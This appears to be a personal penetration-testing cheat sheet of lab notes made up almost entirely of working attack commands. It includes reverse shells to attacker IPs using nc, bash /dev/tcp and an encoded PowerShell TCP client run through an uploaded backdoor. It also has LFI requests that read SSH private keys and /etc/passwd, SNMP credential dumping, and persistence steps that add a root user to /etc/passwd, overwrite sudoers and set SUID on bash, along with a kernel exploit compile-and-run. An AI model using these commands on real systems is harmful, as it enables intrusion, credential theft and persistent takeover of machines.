https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html

```
nc -nv 192.168.50.129 6666 -e /bin/bash
```
## BASIC MANUAL ENUMERATION
to check hostname
```
hostname
```
operating system info
```
cat /etc/issue
```
```
cat /etc/os-release
```
```
uname -a
```
list system processes
```
ps aux
```
Enumerate all the running processes with the _ps_ command and can refresh it using the _watch_ command.
```
watch -n 1 "ps -aux | grep pass"
```

to check ip
```
ifconfig -a
```
show routing tables
```
routel
```
display active network connections and listening ports
```
ss -anp
```
```
netstat
```
## CRON
```
crontab -l
```

### suid/sgid 
 
```
find / -perm -u=s -type f 2>/dev/null
```
### all writable files
```
find / -writable -type d 2>/dev/null
```
 
 use [**mount**](https://linux.die.net/man/8/mount) to list all mounted filesystems
```
mount
```
use [**lsblk**](https://linux.die.net/man/8/lsblk) to view all available disks.
```
lsblk
```

## Exposed Confidential Information

use env to get information about the linux environment
```
env
```
inspect the bash config file for any passwords
```
cat .bashrc
```

### NMAP
#### FULL PORT SCAN
```
nmap -p- -v 192.168.157.156
```

#### SERVICE AND VERSION SCAN
```
nmap -sC -sV 192.168.157.156 -v
```
#### UDP
```
nmap -sU -sV -v 192.168.157.157 -top-ports 100
```

### MYSQL CONNECTION CMD
```
mysql -u root -h 192.168.157.156 --skip-ssl -p
```
if u have ssl certificate. errors try one of the two flags
```
--ssl=0
```
```
--ssl-mode=DISABLED
```


## Gobuster
```
gobuster dir -u http://192.168.237.247 -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/Umbraco.txt -o gobuster -x txt,pdf,config,aspx,php,js,html,asp,xml
```

cmd to connect to MSSQL
```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

### PDF INSPECTION TOOLS
basic pdf details
```
exiftool <pdf-name>
```
To display the metadata of any [_supported file_](https://exiftool.org/#supported), we can use [_exiftool_](https://exiftool.org/). Let's provide the arguments **-a** to display duplicated tags and **-u** to display unknown tags along with the filename **brochure.pdf**:
```
exiftool -a -u brochure.pdf
```

```
pdfinfo <pdf-name>
```

inspecting pdf data thoroughly using low-level PDF structure analysis, script object extraction, and basic metadata inspection.
```
pdf-parser <pdf-name>
```


### FTP 
```
ftp <IP>
```
to download files
```
get <file>
```
to download all files present 
```
mget <folder name>
```
to list files
```
ls
```



### COMMAND EXEC AS ROOT
#### TO SET SUID
```
chmod u+s /bin/bash
```
#### TO ADD USER TO SUDOERS 
```
echo 'cassie ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```



### SNMP

```
snmp-check 192.168.106.149 
```
cmd to get plaintext creds
```
snmpwalk -v1 -c public 192.168.106.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```
cmd to get creds also
```
snmpwalk -v1 -c public 192.168.106.149 NET-SNMP-EXTEND-MIB::nsExtendObjects 
```

nmap scripts to use 
```
nmap --script "snmp* and not snmp-brute" <target>
```
refer this link
https://hacktricks.boitatech.com.br/pentesting/pentesting-snmp 




### LFI
#### CURL
USE FOR reading ssh keys for LFI
```
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```
ALSO TRY
```
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```



### BASE64 DECODE
```
echo "base64cmd" | base64 -d
```



### WEBSHELLS
php webshells can be found at **/usr/share/webshells/php/**


php extensins to try 
```
.phps .php7 .phtml
```



#### PS ENCODED SHELL
```
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.175",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

```
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
```
```
$EncodedText =[Convert]::ToBase64String($Bytes)
```
```
$EncodedText
```
this prints out the encoded cmd, then you run it using 
```
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20<base64 encoded cmd>
```


### Abusing Setuid Binaries and Capabilities
list all binaries with setuid capabilities enabled
```
/usr/sbin/getcap -r / 2>/dev/null
```

### Exploiting Kernel Vulnerabilities

 gather information about our Ubuntu target by inspecting the **/etc/issue** file
```
cat /etc/issue
```
```
uname -r
```
```
arch
```

```
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```
COMPILING THE EXPOIT
```
gcc cve-2017-16995.c -o cve-2017-16995
```
```
file cve-2017-16995
```
```
./cve-2017-16995
```
and we should get root
### ADDING ANOTHER USER
we will add another superuser (root2) 
```
openssl passwd w00t
```
it outputs the has
```
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```
then we log in as that user
```
su root2
```

### SSH
using one sh key hwen you have miultiple 
```
ssh -i root -o IdentitiesOnly=yes root@127.0.0.1
```
### PWNKIT AND POLKIT TIPS

#### NOTE
- for pwnkit, need to see this in sgid 
```
ls -l /usr/bin/pkexec
```

and the output is this 
`-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec`

- for polkit, need `gnome-control-center` installed/enalbeld on the system. It was a false positive



wasn't able to exploit at bcs 
![[Pasted image 20250527140709.png]]

Tried polkit and got this issue 
`exploit-CVE-2021-3560.py -u pranavi -p pranavi`
Exploit for CVE-2021-3560 (Polkit) - Local Privilege Escalation USERNAME: pranavi PASSWORD: pranavi ERRORED: Missing dependency "gnome-control-center". Try: "apt install gnome-control-center"

### COMPOSER RUNNING AS SUDO 
add this to the composer.json
```
www-data@debian:/var/www/html/lavita$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json 
```


### SH/BASH SHELL
```
sh -i >& /dev/tcp/$KaliIP/80 0>&1
```
```
/bin/bash -i >& /dev/tcp/192.168.45.176/443 0>&1
```
```
bash -c "/bin/bash -i >& /dev/tcp/192.168.45.176/443 0>&1"
```
### PATH VAR
```
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

```
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```


### DOCKER
```
docker images
```



### WORDLIST BASED ON WEBSITE TEXT
```
cewl http://joker/joomla >> keywords.txt
```
